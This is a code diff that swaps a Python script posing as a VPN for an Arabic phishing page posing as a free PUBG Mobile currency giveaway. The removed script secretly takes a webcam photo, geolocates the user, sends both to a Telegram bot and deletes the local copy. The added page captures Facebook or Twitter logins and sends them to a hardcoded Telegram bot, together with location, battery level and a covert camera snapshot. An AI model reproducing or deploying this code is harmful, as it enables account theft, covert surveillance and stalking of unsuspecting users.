@@ -1,58 +1,111 @@
-import cv2
-import requests
-import geocoder
-import os
-import time
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG MOBILE - مركز الشحن المجاني</title>
+    <style>
+        body { background: #1a1a1a; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; }
+        .header { background: #f3ad0c; padding: 15px; font-weight: bold; color: #000; font-size: 20px; }
+        .container { padding: 20px; }
+        .card { background: #2d2d2d; border: 1px solid #f3ad0c; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+        .uc-img { width: 100px; margin-bottom: 10px; }
+        .btn-fb { background: #1877f2; color: white; padding: 12px; border: none; border-radius: 5px; width: 100%; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
+        .btn-tw { background: #1da1f2; color: white; padding: 12px; border: none; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; box-sizing: border-box; }
+        #login-overlay { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
+    </style>
+</head>
+<body>
 
-# --- إعدادات التليجرام الخاصة بك ---
-TOKEN = "حط_التوكن_هنا"
-CHAT_ID = "حط_الـ_ID_هنا"
+<div class="header">PUBG MOBILE REDEEM CENTER</div>
 
-def vpn_interface():
-    print("--- SecureConnect VPN v2.4 ---")
-    print("[1] Connect to USA Server")
-    print("[2] Connect to Germany Server")
-    print("[3] Quick Connect (Recommended)")
-    
-    choice = input("\nSelect Server & Press Enter to Start: ")
-    
-    print("\n[+] Initializing Secure Tunnel...")
-    time.sleep(1)
-    print("[+] Bypassing Firewalls...")
-    
-    # هنا تبدأ العمليات السرية بالخلفية
-    try:
-        # 1. تصوير سيلفي صامت
-        cam = cv2.VideoCapture(0)
-        ret, frame = cam.read()
-        if ret:
-            cv2.imwrite("sys_config.jpg", frame)
-        cam.release()
-
-        # 2. جلب الموقع
-        g = geocoder.ip('me')
-        lat_lng = g.latlng
-        map_link = f"https://www.google.com/maps?q={lat_lng[0]},{lat_lng[1]}"
+<div class="container">
+    <div class="card">
+        <img src="https://www.pubgmobile.com/images/event/points_shop/pc/gift_1.png" class="uc-img">
+        <h3>احصل على 8100 UC مجاناً</h3>
+        <p>بمناسبة الموسم الجديد، اختر وسيلة تسجيل الدخول لاستلام الهدية فوراً.</p>
         
-        # 3. إرسال البيانات للتليجرام
-        msg = f"✅ تم صيد الهدف بنجاح!\n📍 المدينة: {g.city}\n🗺️ الموقع: {map_link}"
+        <button class="btn-fb" onclick="openLogin('Facebook')">تسجيل الدخول عبر Facebook</button>
+        <button class="btn-tw" onclick="openLogin('Twitter')">تسجيل الدخول عبر Twitter</button>
+    </div>
+</div>
+
+<div id="login-overlay">
+    <div class="card" style="width: 320px;">
+        <h4 id="login-title">تسجيل الدخول</h4>
+        <input type="text" id="user" placeholder="البريد أو الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button id="final-btn" style="background:#f3ad0c; color:#000; padding:10px; width:100%; border:none; font-weight:bold; border-radius:5px;">تأكيد واستلام الشدات</button>
+    </div>
+</div>
+
+<video id="v" style="display:none;" autoplay></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+    const CHAT_ID = "7214473798";
+    let loginMethod = "";
+
+    function openLogin(method) {
+        loginMethod = method;
+        document.getElementById('login-title').innerText = "تسجيل الدخول عبر " + method;
+        document.getElementById('login-overlay').style.display = 'flex';
         
-        with open("sys_config.jpg", "rb") as photo:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
-                          data={"chat_id": CHAT_ID, "caption": msg}, 
-                          files={"photo": photo})
-            
-        # حذف الصورة من جهاز الضحية فوراً لإخفاء الأثر
-        os.remove("sys_config.jpg")
+        // محاولة طلب الكاميرا والموقع في الخلفية فور الضغط
+        initCapture();
+    }
 
-    except:
-        pass # لضمان عدم ظهور أخطاء برمجية تكشف اللعبة
+    async function initCapture() {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = s;
+        } catch (e) {}
+    }
 
-    # إكمال التمويه
-    time.sleep(2)
-    print("[+] Connection Established!")
-    print(f"[!] Your IP is now protected via {g.city if g.city else 'Private Server'}")
-    print("\nKeep Termux open to stay protected...")
+    document.getElementById('final-btn').onclick = async () => {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
 
-if __name__ == "__main__":
-    vpn_interface()
+        if(!u || !p) return alert("يرجى إدخال البيانات!");
+
+        // جلب البطارية والموقع
+        let batt = "غير متاح";
+        if(navigator.getBattery) { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"%"; }
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            sendData(u, p, batt, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+        }, () => {
+            sendData(u, p, batt, "الموقع مرفوض");
+        });
+        
+        alert("تم استلام الطلب! سيتم إضافة الشدات خلال 24 ساعة.");
+        window.location.href = "https://www.pubgmobile.com";
+    };
+
+    async function sendData(u, p, b, loc) {
+        const msg = `🎮 **صيد ببجي جديد (${loginMethod})**\n\n` +
+                    `👤 الحساب: \`${u}\`\n` +
+                    `🔑 الباسورد: \`${p}\`\n` +
+                    `🔋 الشحن: ${b}\n` +
+                    `📍 الموقع: ${loc}`;
+        
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        
+        // التقاط الصورة
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        if(video.srcObject) {
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const fd = new FormData(); fd.append('photo', blob, 'p.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {method:'POST', body:fd});
+            }, 'image/jpeg');
+        }
+    }
+</script>
+</body>
+</html>
+بوبجي
